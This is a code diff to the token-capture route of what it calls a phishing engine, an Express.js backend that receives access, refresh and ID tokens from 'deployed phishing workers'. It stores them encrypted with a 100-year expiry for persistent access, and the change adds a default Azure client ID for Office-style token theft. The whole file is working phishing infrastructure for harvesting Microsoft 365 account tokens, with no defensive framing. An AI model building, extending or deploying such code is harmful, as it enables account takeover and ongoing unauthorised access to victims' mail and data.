@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Token Capture Routes
- * Receives tokens from deployed workers
+ * Receives tokens from deployed phishing workers
  */
 const express = require('express');
 const router = express.Router();
@@ -73,8 +73,9 @@ router.post('/', async (req, res) => {
 
         // Insert token record (encrypted) with 100-year expiration for persistent access
         const ttlHours = 24 * 365 * 100; // 100 years
+        const clientIdUsed = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
         const [result] = await db.query(
-            `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type) VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?)`,
+            `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id) VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR), ?, ?, ?)`,
             [
                 user_id,
                 link_id,
@@ -86,7 +87,8 @@ router.post('/', async (req, res) => {
                 user_agent || 'Phishing Worker',
                 ttlHours,
                 tenant,
-                link.template_type || 'office'
+                link.template_type || 'office',
+                clientIdUsed
             ]
         );
 
